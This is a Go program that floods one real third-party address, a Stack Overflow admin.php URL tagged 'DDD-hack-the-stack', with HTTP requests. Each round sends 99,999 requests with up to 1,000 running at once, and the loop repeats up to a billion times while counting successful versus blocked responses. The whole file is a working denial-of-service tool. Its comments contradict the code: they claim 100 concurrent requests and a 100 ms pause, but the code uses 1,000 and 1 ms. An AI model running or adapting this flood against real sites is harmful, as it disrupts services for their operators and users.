package main

import (
	"fmt"
	"sync"
	"time"

	"github.com/valyala/fasthttp"
)

func downloadLink(url string, wg *sync.WaitGroup, client *fasthttp.Client, successCount *int, blockedCount *int) {
	defer wg.Done()

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(url)

	err := client.DoTimeout(req, resp, 5*time.Second) // Set a timeout for the request

	if err != nil {
		// fmt.Printf("Error downloading %s: %s\n", url, err.Error())
		// Increment blockedCount when there's an error
		*blockedCount++
		return
	}

	// Handle the response here
	// ...

	// Increment successCount when a response is received
	*successCount++
}

func downloadAll(urls []string, client *fasthttp.Client, wg *sync.WaitGroup, successCount *int, blockedCount *int) {
	semaphore := make(chan struct{}, 1000) // Limit concurrency to 100 simultaneous requests

	for _, url := range urls {
		wg.Add(1)
		semaphore <- struct{}{}
		go func(u string) {
			defer func() { <-semaphore }()
			downloadLink(u, wg, client, successCount, blockedCount)
		}(url)

		time.Sleep(1* time.Millisecond) // Pause for 100 milliseconds between each request
	}

	wg.Wait()
}

func main() {
	urlList := make([]string, 99999)
	for i := range urlList {
		urlList[i] = "https://stackoverflow.com/admin.php?DDD-hack-the-stack" // Replace with your actual URL
	}

	iterations := 1000000000 // Number of times to iterate the code (reduced for testing)

	client := &fasthttp.Client{}
	wg := sync.WaitGroup{}

	for i := 0; i < iterations; i++ {
		start := time.Now()

		// Initialize counters for each iteration
		successCount := 0
		blockedCount := 0

		downloadAll(urlList, client, &wg, &successCount, &blockedCount)

		end := time.Now()
		duration := end.Sub(start)
		seconds := duration.Seconds()

		fmt.Printf("Iteration %d: Downloaded %d links in %.2f seconds\n", i+1, len(urlList), seconds)
		fmt.Printf("Successful: ", successCount ,"Blocked: ", blockedCount)
		//fmt.Printf("Successful requests: %d\n", successCount)
		//fmt.Printf("Blocked requests: %d\n", blockedCount)
	}
}
